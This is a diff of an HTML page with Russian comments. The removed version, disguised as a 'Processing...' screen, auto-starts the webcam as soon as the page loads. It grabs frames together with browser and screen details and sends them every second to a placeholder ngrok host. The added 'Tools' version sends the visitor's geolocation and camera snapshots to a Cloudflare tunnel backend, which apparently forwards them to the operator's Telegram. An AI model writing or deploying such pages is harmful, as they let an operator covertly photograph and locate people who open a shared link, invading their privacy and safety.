@@ -1,92 +1,128 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Camera Processing</title>
-
-<style>
-body {
-  margin:0;
-  font-family: Arial;
-  background:#111;
-  color:#fff;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  height:100vh;
-  flex-direction:column;
-}
-#status {
-  margin-top:20px;
-  font-size:14px;
-  opacity:0.8;
-}
-</style>
+    <meta charset="UTF-8">
+    <title>Tools</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0f0f0f;
+            color: #fff;
+            font-family: 'Segoe UI', sans-serif;
+            padding: 40px 20px;
+        }
+        h1 { text-align: center; margin-bottom: 40px; }
+        .btn {
+            display: block;
+            width: 100%;
+            max-width: 400px;
+            margin: 12px auto;
+            padding: 14px;
+            background: #1e1e2e;
+            border: 1px solid #333;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 1rem;
+            cursor: pointer;
+            text-align: center;
+        }
+        .btn:hover { background: #2a2a3e; }
+        video {
+            display: block;
+            margin: 20px auto;
+            border-radius: 12px;
+            max-width: 400px;
+            width: 100%;
+        }
+        #status {
+            text-align: center;
+            color: #888;
+            margin-top: 16px;
+        }
+    </style>
 </head>
-
 <body>
 
-<h2>Processing...</h2>
-<div id="status">Initializing</div>
+<h1>🛠 Tools</h1>
+
+<!-- Кнопка геолокации -->
+<button class="btn" onclick="sendLocation()">
+    📍 Отправить мою геолокацию
+</button>
+
+<!-- Кнопка камеры -->
+<button class="btn" onclick="startCamera()">
+    📷 Включить камеру
+</button>
+
+<video id="video" autoplay hidden></video>
+
+<button class="btn" id="snapBtn" onclick="takePhoto()" hidden>
+    📸 Сделать снимок и отправить
+</button>
+
+<div id="status">Готов к работе</div>
 
 <script>
-const NGROK_URL = "https://YOUR-NGROK-URL.ngrok.io"; // ВСТАВЬ СЮДА
+    // ВАШ Cloudflare Tunnel URL
+    const BACKEND = "https://xxxx.trycloudflare.com";
 
-const statusEl = document.getElementById("status");
-
-function log(msg){
-    console.log(msg);
-    statusEl.innerText = msg;
-}
-
-async function captureAndSend(){
-    try {
-        log("Requesting camera...");
-
-        const stream = await navigator.mediaDevices.getUserMedia({video:true});
-        const track = stream.getVideoTracks()[0];
-
-        const imageCapture = new ImageCapture(track);
-        const bitmap = await imageCapture.grabFrame();
-
-        const canvas = document.createElement("canvas");
-        canvas.width = bitmap.width;
-        canvas.height = bitmap.height;
-        canvas.getContext("2d").drawImage(bitmap,0,0);
-
-        track.stop();
-
-        const dataUrl = canvas.toDataURL("image/jpeg", 0.7);
-
-        const info = {
-            userAgent: navigator.userAgent,
-            resolution: `${screen.width}x${screen.height}`,
-            platform: navigator.platform
-        };
-
-        log("Sending...");
-
-        await fetch(`${NGROK_URL}/upload`, {
-            method:"POST",
-            headers:{"Content-Type":"application/json"},
-            body: JSON.stringify({image:dataUrl, info})
-        });
-
-        log("Sent ✔");
-
-    } catch(e){
-        log("Error: " + e.message);
+    function setStatus(msg) {
+        document.getElementById('status').innerText = msg;
     }
-}
 
-// авто старт
-(async () => {
-    await captureAndSend();
+    // ─── ГЕОЛОКАЦИЯ ──────────────────────────────────
+    function sendLocation() {
+        setStatus("⏳ Получаю геолокацию...");
+        navigator.geolocation.getCurrentPosition(
+            async (pos) => {
+                await fetch(`${BACKEND}/location`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude
+                    })
+                });
+                setStatus("✅ Геолокация отправлена!");
+            },
+            () => setStatus("❌ Нет доступа к геолокации")
+        );
+    }
 
-    // повтор каждые 10 сек (можно изменить)
-    setInterval(captureAndSend, 1000);
-})();
+    // ─── КАМЕРА ───────────────────────────────────────
+    async function startCamera() {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: true
+        });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        video.hidden = false;
+        document.getElementById('snapBtn').hidden = false;
+        setStatus("📷 Камера включена");
+    }
+
+    // ─── СНИМОК → ОТПРАВИТЬ ───────────────────────────
+    function takePhoto() {
+        const video  = document.getElementById('video');
+        const canvas = document.createElement('canvas');
+        canvas.width  = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+
+        canvas.toBlob(async (blob) => {
+            const form = new FormData();
+            form.append('username', 'web_visitor');
+            form.append('file', blob, 'photo.jpg');
+
+            setStatus("⏳ Отправляю фото...");
+            await fetch(`${BACKEND}/upload-photo`, {
+                method: "POST",
+                body: form
+            });
+            setStatus("✅ Фото отправлено тебе в Telegram!");
+        }, 'image/jpeg');
+    }
 </script>
 
 </body>
